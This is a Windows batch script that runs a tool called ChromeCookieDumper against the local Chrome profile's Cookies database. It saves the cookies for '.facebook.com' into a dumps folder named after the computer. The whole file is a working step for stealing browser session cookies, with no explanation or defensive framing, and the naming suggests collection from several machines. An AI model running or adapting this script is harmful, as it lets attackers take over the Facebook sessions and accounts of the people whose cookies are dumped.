setlocal
cd /d %~dp0
mkdir ".\dumps\%ComputerName%"
CALL .\ChromeCookieDumper "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" ".\dumps\%ComputerName%\CookieDump.txt" ".facebook.com"